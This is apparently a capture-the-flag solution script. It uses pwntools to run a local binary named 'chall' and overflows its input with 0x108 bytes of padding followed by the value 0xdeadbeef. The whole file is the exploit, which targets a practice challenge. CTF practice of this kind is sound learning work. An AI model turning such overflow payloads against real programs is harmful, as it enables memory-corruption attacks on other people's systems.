from pwn import *

r = process("./chall")
print(r.recvuntil(b"What do you see?"))
r.sendline(b"A"*(0x110 - 0x8) + p64(0xdeadbeef))
print(r.recvall())